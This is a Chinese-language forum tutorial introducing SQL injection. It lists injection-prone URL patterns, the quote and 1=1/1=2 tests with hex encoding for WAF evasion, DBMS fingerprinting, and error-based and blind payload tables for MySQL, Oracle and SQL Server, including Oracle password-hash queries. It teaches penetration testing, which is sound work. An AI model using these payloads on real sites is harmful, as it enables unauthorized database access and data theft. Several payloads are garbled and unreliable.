@@ -1,0 +1,335 @@
+## [i春秋作家：anyedt](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=beef)
+
+**原文来自：[https://bbs.ichunqiu.com/thread-41701-1-1.html](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=beef)**
+
+## 引言
+
+作为长期占据 OWASP Top 10
+首位的注入，认识它掌握它是每个[渗透测试](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=beef)人员必不可少的一个过程。下面我们一起学习SQL注入，本篇为SQL之重新认识，下一篇为SQL之老生常谈，主要讲解绕过和工具注入的知识。
+
+## 0x00 SQL注入简介
+
+所谓SQL注入，就是通过把SQL命令插入到Web[表单](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=beef)提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。
+[1]
+比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到[SQL注入式攻击](https://bbs.ichunqiu.com/thread-41701-1-1.html?from=beef)．
+
+## 0x01 注入原理
+
+程序命令没能对用户输入的内容能作出正确的处理导致执行非预期命令或访问数据。或者说产生注入的原因是接受相关参数未经正确处理直接带入数据库进行查询操作。发起注入攻击需要存在可控参数（数据）提交方式的确认和SQL命令相关点。
+
+  
+![image.png](https://image.3001.net/images/20180615/15290309341063.png!small)  
+
+## 0x02 明确常见存在SQL注入网站链接形式
+
+常见的出现SQL注入的网站链接形式:
+
+    
+    
+    http://www.zhangweishibi***.com/***.asp?id=xx  （ASP）
+    http://www.zhangweishibi***.com/***.php?id=xx   (PHP)
+    http://www.zhangweishibi***.com/***.jsp?id=xx   (JSP)
+    http://www.zhangweishibi***.com/***.aspx?id=xx  (ASPX)
+    http://www.zhangweishibi***.com/***.asp?id=xx&page=** (注入的时候需要明确注入的参数是id还是page,工具默认对后面的page参数进行注入，如需改变需要手动设置)
+    http://www.zhangweishibi***.com/news/id/* 伪静态
+    http://www.zhangweishibi***.com/index/new/php8.html 伪静态
+    （**在这里代表有可能为数字或者字符串）
+
+## 0x03 常见脚本数据库默认组合
+
+    
+    
+    asp  +  access/SQLServer
+    php  +  Mysql
+    jsp  +  Oracle 
+
+## 0x04 常见判断是否存在注入漏洞的方法
+
+### 1.单双引号报错法
+
+在网站链接地址后面加上单或者双引号，网站没能正常显示而是显示异常信息，则说明该链接可能存在注入漏洞。一般返回的异常信息包含有SQL语句，知道目标网站的SQL语句至关重要，因为知道SQL语句可以更好绕过检测进行注入。举个栗子：
+
+![image.png](https://image.3001.net/images/20180615/15290309499184.png!small)![image.png](https://image.3001.net/images/20180615/15290309549610.png!small)  
+
+![image.png](https://image.3001.net/images/20180615/1529030959580.png!small)  
+
+### 2.正确错误法
+
+我把它命名为正确错误法，其实它就是就是经典的and 1=1、and 1=2 测试法。利用的是1=1永远为真，1=2永远为假的原理。当使用and
+1=1进行测试时返回正常页面而and 1=2进行测试时返回错误页面或者页面没有正常显示则说明该链接存在SQL 漏洞。
+
+#### 举个栗子（注意为了绕过WAF，我把1和2转为了十六进制）
+
+第一步：数字转为16进制
+
+![image.png](https://image.3001.net/images/20180615/15290309919582.png!small)  
+
+![image.png](https://image.3001.net/images/20180615/15290309975090.png!small)  
+
+第二步：直接注入判断
+
+当and 1=1 时候页面显示正常，而and 1=2
+页面显示出错。说明存在注入点。![image.png](https://image.3001.net/images/20180615/15290310058947.png!small)
+
+![image.png](https://image.3001.net/images/20180615/15290310114058.png!small)  
+
+## 0x05 SQL注入参数类型判断
+
+按参数类型主要分为下面三种：
+
+### (1) 数字型
+
+字段=数字 这类注入的参数是数字型，SQL 语句原貌大致如下：Select * from user where 字段=1;
+
+注入的参数为 ID=49 And [查询条件]，即是生成语句：Select * from 表名 where 字段=49 And [查询条件]
+
+### (2) 字符型
+
+SQL 语句原貌大致概如下：Select * from 表名 where 字段=’asd‘
+
+### (3) 搜索型
+
+这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的
+SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'`。
+
+## 0x06 判断常见数据库类型
+
+不同的数据库的函数、注入方法都是有差异的，所以在注入之前，我们还要判断一下数据库的类型。识别数据库管理系统(DBMS)的类型是注入中不可或缺的一环，因为不知道DBMS的类型，不同的DBMS都有特有的属性或者内置功能，而我们注入的时候往往需要使用到其特有的属性或者内置功能，所以识别DBMS的类型是不可或缺的一部分。（--在数据库中代表是注释的意思）注意：以下方法可能会因为数据库版本的不同产生差异。
+
+#### a.MYSQL数据库
+
+描述| 语句  
+---|---  
+SLEEP（睡眠）| page.php?id=1-SLEEP(1)=0 LIMIT 1 --  
+BENCHMARK| page.php?id=1-BENCHMARK(5000000,ENCODE('str','key') )=1 LIMIT 1 --  
+字符串拼接| page.php?id=` 'mysql' --  
+触发错误有可能会报出DBMS类型| page.php?id=`  
+联合查询| product.php?id=` UNION (SELECT @@version) --  
+  
+实验环境使用的是zzcms8.2。
+
+1.BENCHMARK()
+
+MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。
+表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。请注意：该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()比SHA1()函数要快：
+
+![image.png](https://image.3001.net/images/20180615/15290310442004.png!small)![image.png](https://image.3001.net/images/20180615/15290310498499.png!small)![image.png](https://image.3001.net/images/20180615/15290310539463.png!small)![image.png](https://image.3001.net/images/20180615/15290310561595.png!small)  
+
+2.字符串拼接
+
+MYSQL允许进行字符串拼接。
+
+![image.png](https://image.3001.net/images/20180615/15290310671119.png!small)![image.png](https://image.3001.net/images/20180615/15290310704313.png!small)![image.png](https://image.3001.net/images/20180615/15290310756231.png!small)  
+
+#### b.Oracle数据库
+
+根据应用程序所提供的错误，如果有一个“ora-xxxx”错误，每个x是一个整数，这意味着数据库是Oracle，JSP应用程序通常有Oracle数据库。
+
+字符串拼接| page.jsp?id='\| \| 'oracle' --  
+---|---|---|---  
+默认表| page.jsp?id='UNION SELECT 1 FROM v$version --  
+触发错误有可能会报出DBMS类型| page.jsp?id='  
+  
+联合| product.jsp?id=' UNION SELECT banner FROM v$version --  
+---|---  
+联合查询| product.jsp?id=' UNION (SELECT banner FROM v$version) --  
+联合空值 注意：如果原始查询返回多个列，加零等于columns-1| product.jsp?id=' UNION SELECT banner,null
+FROM v$version --  
+  
+#### c.SQL Server
+
+延时函数| page.asp?id=';WAITFOR DELAY '00:00:10'; --  
+---|---  
+默认变量| page.asp?id=sql'; SELECT @@SERVERNAME --  
+触发错误有可能会报出DBMS类型| page.asp?id=0/@@SERVERNAME  
+  
+## 0x07 认识SQL注入类型
+
+#### （1）基于报错注入
+
+页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+
+MYSQL数据库
+
+描述| 查询语句  
+---|---  
+XML 解析错误| SELECT extractvalue(rand(),concat(0x3a,(select version())))  
+子查询| SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(),concat(0x3a,(SELECT username
+FROM USERS LIMIT 0,1),FLOOR(rand(0)2))x FROM information_schema.TABLES GROUP
+BY x)a) Increment Limit 0,1 to Limit 1,1 to begin cycling through data  
+获取当前数据库| SELECT a()  
+  
+Oracle数据库
+
+描述| 查询语句  
+---|---  
+无效HTTP请求| SELECT utl_inaddr.get_host_name((select banner from v$version where
+rownum=1)) FROM dual  
+CTXSYS.DRITHSX.SN| SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version
+where rownum=1)) FROM dual  
+无效xml路径| SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version
+where rownum=1),user,user) FROM dual  
+无效XML| SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from
+sys.dual)||'" FROM sys.dual')) FROM dual  
+无效XML| SELECT rtrim(extract(xmlagg(xmlelement("s", username ||
+',')),'/s').getstringval(),',') FROM all_users  
+  
+SQL server
+
+描述| 查询语句  
+---|---  
+显式转换| SELECT convert(int,(SELECT @@version)) SELECT cast((SELECT @@version) as
+int)  
+隐式转换| SELECT 1/@@version  
+  
+#### （2）基于时间的盲注
+
+不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+
+#### （3）基于布尔的盲注
+
+MYSQL数据库
+
+返回页面判断条件真假的注入。
+
+部分盲注可以观察不同的HTTP状态码，确定响应时间、内容的长度，并在HTTP响应中的查看HTML内容来进行确认。
+
+描述| 查询语句  
+---|---  
+数据库版本是否等于5..| SELECT substring(version(),1,1)=5  
+重复使用语句| SELECT 1 AND (select 1)=1  
+查询log_table是否存在| SELECT 1 AND (select 1 from log_table limit 0,1)=1  
+查询第一个字符是否为T| SELECT ascii(substring((SELECT message from log_table limit
+0,1),1,1))=114  
+  
+全盲
+
+描述| 查询语句  
+---|---  
+是否是根用户| SELECT IF(user() LIKE 'root@%', SLEEP(5), null)  
+是否是根用户(方法)| SELECT IF(user() LIKE 'root@%', BENCHMARK(5000000, ENCODE('Slow
+Down','by 5 seconds')), null)  
+数据库版本是否等于5..| SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)  
+  
+Oracle数据库
+
+部分盲注可以观察不同的HTTP状态码，确定响应时间、内容的长度，并在HTTP响应中的查看HTML内容来进行确认。
+
+描述| 查询语句  
+---|---  
+查看版本是否是12.2| SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';  
+选择再启用| SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)  
+查询log_table是否存在| SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);  
+  
+全盲
+
+描述| 查询语句  
+---|---  
+查看版本是否是12.2| SELECT CASE WHEN (SELECT COUNT() FROM v$version WHERE banner LIKE
+'Oracle%11.2%')=1 THEN (SELECT count() FROM all_users a, all_users b,
+all_users c, all_users d) ELSE 0 END FROM dual  
+  
+SQL server
+
+Description| Query  
+---|---  
+版本是否为12.0.2000.8| SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'  
+选择再启用| SELECT (SELECT @@version)  
+查询log_table是否存在| SELECT * FROM log_table  
+  
+全盲
+
+Description| Query  
+---|---  
+查看版本是否是12.2| IF exists(SELECT @@version where @@version like '%12.0.2000.8%')
+WAITFOR DELAY '00:00:02'  
+  
+## 0x07 SQL注入常用函数及注入语句
+
+    
+    
+    Access：asc(字符) SQLServer：unicode(字符) 作用：返回某字符的 ASCII 码
+    
+    Access：chr(数字) SQLServer：nchar(数字) 作用：与 asc 相反，根据 ASCII 码返回字符
+    
+    Access：mid(字符串,N,L) SQLServer：substring(字符串,N,L) 作用：返回字符串从 N 个字符起长度为 L 的子字符串，即 N 到 N+L 之间的字符串
+    
+    Access：abc(数字) SQLServer：abc (数字) 作用：返回数字的绝对值（在猜解汉字的时候会用到）
+    
+    Access：A between B And C SQLServer：A between B And C 作用：判断 A 是否界于 B 与 C 之间
+    
+    
+    
+    Mysql:
+    version()  MySQL 版本
+    user()  数据库用户名
+    database() 数据库名
+    @@datadir 数据库路径
+    @@version_compile_os  操作系统版本
+    hex() 把十进制转为十六进制
+    concat() 连接字符串
+    ascii() ascii编码
+    length（) 获取长度
+    substring() mid（） 取出字符串
+    group_concat() 连接一个组的所有字符串 以逗号分隔每一条数据
+    updatexml()、extractvalue() 用于报错注入
+    sleep（）  休眠
+    
+    猜数据库 select schema_name from information_schema.schemata
+    猜某库的数据表 select table_name from information_schema.tables where table_schema=’xxxxx’
+    猜某表的所有列 Select column_name from information_schema.columns where table_name=’xxxxx’
+    获取某列的内容 Select xx_column from xx_table
+    
+    列出所有的数据库
+    select group_concat(schema_name) from information_schema.schemata
+    
+    列出某个库当中所有的表
+    select group_concat(table_name) from information_schema.tables where table_schema='xxxxx'
+    
+    
+    
+    Oracle
+    解析IP
+    select utl_inaddr.get_host_address('google.com') from dual;
+    
+    获取本机IP地址
+    select utl_inaddr.get_host_address from dual;
+    
+    根据IP地址反向解析主机名
+    select utl_inaddr.get_host_name('*.*.*.*') from dual;
+    
+    -- 获取系统信息
+    select banner from v$version where rownum=1 ; -- oracle versi
+    --获取用户信息
+    select user from dual; -- current user
+    select username from user_users; -- current user
+    select username from all_users; -- all user , the current user can see...
+    select username from dba_users; -- all user , need pris
+    
+    -- 获取密码hash
+    select name, password, astatus from sys.user$; -- password hash <=10g , need privs
+    select name, password, spare4 from sys.user$; -- password has 11g , need privs
+    
+    -- 数据库
+    select global_name from global_name; -- current database
+    select sys.database_name from dual; -- current database
+    select name from v$database; -- current database name , need privs
+    select instance_name from v$instance; -- current database name , need privs
+    
+    -- 模式
+    select distinct owner from all_tables; -- all schema
+    
+    -- 表
+    select table_name from all_tables where owner='xxx'; -- all table name
+    
+    -- 列
+    select owner,table_name,column_name from all_tab_columns where table_name='xxx';
+    select owner,table_name,column_name from all_tab_cols where table_name='xxx';
+
+## 0x08总结
+
+本文总结了许多注入基础点，学习是从点到线到面的过程。别少看了点的积累，没有点的累积何来线面。所以大家一定要重视基础知识。
+
+有问题大家可以留言哦，也欢迎大家到春秋论坛中来耍一耍
+[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)  
+
